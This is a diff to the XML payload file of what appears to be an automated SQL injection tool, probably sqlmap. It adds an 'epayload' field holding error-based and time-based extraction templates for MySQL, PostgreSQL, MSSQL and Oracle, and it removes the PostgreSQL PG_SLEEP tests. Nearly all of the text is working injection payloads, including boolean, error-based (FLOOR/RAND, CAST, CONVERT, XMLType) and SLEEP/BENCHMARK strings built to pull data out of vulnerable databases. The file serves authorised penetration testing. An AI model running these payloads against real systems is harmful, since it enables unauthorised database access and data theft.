@@ -126,6 +126,9 @@ Tag: <test>
                original value to its negative representation
             3: Replace the parameter original value
 
+    Sub-tag: <epayload>
+        The payload that will be used to exploit the injection point.
+
     Sub-tag: <request>
         What to inject for this test.
 
@@ -187,6 +190,7 @@ Formats:
         <risk></risk>
         <clause></clause>
         <where></where>
+        <epayload></epayload>
         <request>
             <payload></payload>
             <comment></comment>
@@ -403,6 +407,7 @@ Formats:
         <risk>1</risk>
         <clause>1</clause>
         <where>1</where>
+        <epayload></epayload>
         <request>
             <payload>AND [RANDNUM]=[RANDNUM]</payload>
         </request>
@@ -418,6 +423,7 @@ Formats:
         <risk>3</risk>
         <clause>1</clause>
         <where>1</where>
+        <epayload></epayload>
         <request>
             <payload>OR [RANDNUM]=[RANDNUM]</payload>
         </request>
@@ -436,6 +442,7 @@ Formats:
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
+        <epayload></epayload>
         <request>
             <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</payload>
         </request>
@@ -455,6 +462,7 @@ Formats:
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
+        <epayload></epayload>
         <request>
             <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
         </request>
@@ -473,6 +481,7 @@ Formats:
         <risk>1</risk>
         <clause>3</clause>
         <where>1</where>
+        <epayload></epayload>
         <request>
             <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
         </request>
@@ -491,6 +500,7 @@ Formats:
         <risk>1</risk>
         <clause>3</clause>
         <where>1</where>
+        <epayload></epayload>
         <request>
             <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/0 END) FROM DUAL)</payload>
         </request>
@@ -511,6 +521,7 @@ Formats:
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
+        <epayload></epayload>
         <request>
             <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/0 END))</payload>
         </request>
@@ -526,6 +537,7 @@ Formats:
         <risk>1</risk>
         <clause>2,3</clause>
         <where>3</where>
+        <epayload></epayload>
         <request>
             <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</payload>
         </request>
@@ -545,6 +557,7 @@ Formats:
         <risk>1</risk>
         <clause>2,3</clause>
         <where>3</where>
+        <epayload></epayload>
         <request>
             <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
         </request>
@@ -563,6 +576,7 @@ Formats:
         <risk>1</risk>
         <clause>3</clause>
         <where>3</where>
+        <epayload></epayload>
         <request>
             <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
         </request>
@@ -581,6 +595,7 @@ Formats:
         <risk>1</risk>
         <clause>3</clause>
         <where>3</where>
+        <epayload></epayload>
         <request>
             <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/0 END) FROM DUAL)</payload>
         </request>
@@ -601,6 +616,7 @@ Formats:
         <risk>1</risk>
         <clause>2,3</clause>
         <where>3</where>
+        <epayload></epayload>
         <request>
             <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/0 END))</payload>
         </request>
@@ -619,6 +635,7 @@ Formats:
         <risk>0</risk>
         <clause>1</clause>
         <where>1</where>
+        <epayload>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(%s),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</epayload>
         <request>
             <payload>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
         </request>
@@ -638,6 +655,7 @@ Formats:
         <risk>0</risk>
         <clause>1</clause>
         <where>1</where>
+        <epayload>AND [RANDNUM]=CAST('[DELIMITER_START]'||(%s)::text||'[DELIMITER_STOP]' AS NUMERIC)</epayload>
         <request>
             <payload>AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)</payload>
         </request>
@@ -656,6 +674,7 @@ Formats:
         <risk>0</risk>
         <clause>1</clause>
         <where>1</where>
+        <epayload>AND [RANDNUM]=CONVERT(INT,('[DELIMITER_START]'+(%s)+'[DELIMITER_STOP]'))</epayload>
         <request>
             <payload>AND [RANDNUM]=CONVERT(INT,('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))</payload>
         </request>
@@ -674,6 +693,7 @@ Formats:
         <risk>0</risk>
         <clause>1</clause>
         <where>1</where>
+        <epayload>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</epayload>
         <request>
             <payload>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
@@ -699,6 +719,7 @@ Formats:
         <risk>0</risk>
         <clause>2,3</clause>
         <where>1</where>
+        <epayload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(%s),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</epayload>
         <request>
             <payload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
         </request>
@@ -718,6 +739,7 @@ Formats:
         <risk>0</risk>
         <clause>2,3</clause>
         <where>1</where>
+        <epayload>(CAST('[DELIMITER_START]'||(%s)::text||'[DELIMITER_STOP]' AS NUMERIC))</epayload>
         <request>
             <payload>(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))</payload>
         </request>
@@ -736,6 +758,7 @@ Formats:
         <risk>0</risk>
         <clause>3</clause>
         <where>1</where>
+        <epayload>(CONVERT(INT,('[DELIMITER_START]'+(%s)+'[DELIMITER_STOP]')))</epayload>
         <request>
             <payload>(CONVERT(INT,('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))</payload>
         </request>
@@ -754,6 +777,7 @@ Formats:
         <risk>0</risk>
         <clause>3</clause>
         <where>1</where>
+        <epayload>(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</epayload>
         <request>
             <payload>(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
@@ -772,6 +796,7 @@ Formats:
         <risk>0</risk>
         <clause>2,3</clause>
         <where>3</where>
+        <epayload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(%s),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</epayload>
         <request>
             <payload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
         </request>
@@ -791,6 +816,7 @@ Formats:
         <risk>0</risk>
         <clause>2,3</clause>
         <where>3</where>
+        <epayload>(CAST('[DELIMITER_START]'||(%s)::text||'[DELIMITER_STOP]' AS NUMERIC))</epayload>
         <request>
             <payload>(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))</payload>
         </request>
@@ -809,6 +835,7 @@ Formats:
         <risk>0</risk>
         <clause>3</clause>
         <where>3</where>
+        <epayload>(CONVERT(INT,('[DELIMITER_START]'+(%s)+'[DELIMITER_STOP]')))</epayload>
         <request>
             <payload>(CONVERT(INT,('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))</payload>
         </request>
@@ -827,6 +854,7 @@ Formats:
         <risk>0</risk>
         <clause>3</clause>
         <where>3</where>
+        <epayload>(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</epayload>
         <request>
             <payload>(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
@@ -1078,6 +1106,7 @@ Formats:
         <risk>1</risk>
         <clause>1</clause>
         <where>1</where>
+        <epayload>AND IF((%s), [RANDNUM], SLEEP([SLEEPTIME]))</epayload>
         <request>
             <payload>AND SLEEP([SLEEPTIME])</payload>
         </request>
@@ -1097,6 +1126,7 @@ Formats:
         <risk>1</risk>
         <clause>1</clause>
         <where>1</where>
+        <epayload>AND IF((%s), [RANDNUM], BENCHMARK(5000000, MD5('[SLEEPTIME]'))</epayload>
         <request>
             <payload>AND BENCHMARK(5000000, MD5('[SLEEPTIME]'))</payload>
         </request>
@@ -1109,31 +1139,13 @@ Formats:
     </test>
 
     <test>
-        <title>PostgreSQL &gt; 8.1 AND time-based blind</title>
-        <stype>5</stype>
-        <level>1</level>
-        <risk>1</risk>
-        <clause>1</clause>
-        <where>1</where>
-        <request>
-            <payload>AND PG_SLEEP([SLEEPTIME])</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>PostgreSQL</dbms>
-            <dbms_version>&gt; 8.1</dbms_version>
-        </details>
-    </test>
-
-    <test>
         <title>SQLite &gt; 2.0 AND time-based blind</title>
         <stype>5</stype>
         <level>3</level>
         <risk>1</risk>
         <clause>1</clause>
         <where>1</where>
+        <epayload></epayload>
         <request>
             <payload>AND LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(10000000))))</payload>
         </request>
@@ -1154,6 +1166,7 @@ Formats:
         <risk>1</risk>
         <clause>1</clause>
         <where>1</where>
+        <epayload></epayload>
         <request>
             <payload>AND (COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6) > 0</payload>
         </request>
@@ -1167,7 +1180,7 @@ Formats:
     </test>
     <!--
          NOTE: there is no way to perform this test against Microsoft SQL
-         Server, Sybase, Oracle or PostgreSQL < 8.2
+         Server, Sybase, Oracle or PostgreSQL
     -->
     <!-- TODO: if possible, add payload for Microsoft Access and SAP MaxDB -->
     <!-- End of AND time-based blind tests -->
@@ -1181,6 +1194,7 @@ Formats:
         <risk>3</risk>
         <clause>1</clause>
         <where>1</where>
+        <epayload>OR IF((%s), [RANDNUM], SLEEP([SLEEPTIME]))</epayload>
         <request>
             <payload>OR SLEEP([SLEEPTIME])</payload>
         </request>
@@ -1200,6 +1214,7 @@ Formats:
         <risk>3</risk>
         <clause>1</clause>
         <where>1</where>
+        <epayload>OR IF((%s), [RANDNUM], BENCHMARK(5000000, MD5('[SLEEPTIME]'))</epayload>
         <request>
             <payload>OR BENCHMARK(5000000, MD5('[SLEEPTIME]'))</payload>
         </request>
@@ -1212,31 +1227,13 @@ Formats:
     </test>
 
     <test>
-        <title>PostgreSQL &gt; 8.1 OR time-based blind</title>
-        <stype>5</stype>
-        <level>2</level>
-        <risk>3</risk>
-        <clause>1</clause>
-        <where>1</where>
-        <request>
-            <payload>OR PG_SLEEP([SLEEPTIME])</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>PostgreSQL</dbms>
-            <dbms_version>&gt; 8.1</dbms_version>
-        </details>
-    </test>
-
-    <test>
         <title>SQLite &gt; 2.0 OR time-based blind</title>
         <stype>5</stype>
         <level>4</level>
         <risk>3</risk>
         <clause>1</clause>
         <where>1</where>
+        <epayload></epayload>
         <request>
             <payload>OR LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(10000000))))</payload>
         </request>
@@ -1257,6 +1254,7 @@ Formats:
         <risk>3</risk>
         <clause>1</clause>
         <where>1</where>
+        <epayload></epayload>
         <request>
             <payload>OR (COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6) > 0</payload>
         </request>
@@ -1270,7 +1268,7 @@ Formats:
     </test>
     <!--
          NOTE: there is no way to perform this test against Microsoft SQL
-         Server, Sybase, Oracle or PostgreSQL < 8.2
+         Server, Sybase, Oracle or PostgreSQL
     -->
     <!-- TODO: if possible, add payload for Microsoft Access and SAP MaxDB -->
     <!-- End of OR time-based blind tests -->
